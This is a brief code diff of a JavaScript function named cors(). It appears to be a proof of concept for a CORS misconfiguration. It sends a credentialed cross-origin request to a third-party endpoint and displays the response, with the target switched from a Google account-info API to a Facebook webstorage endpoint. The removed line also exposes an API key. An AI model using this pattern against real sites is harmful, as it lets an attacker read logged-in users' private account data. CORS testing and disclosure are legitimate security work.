@@ -16,7 +16,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyAbRoYZEJjGDhEfIO8J_b1gATouT-T4T5k", true);
+  xhttp.open("GET", "https://www.facebook.com/ajax/webstorage/process_keys/?state=1", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
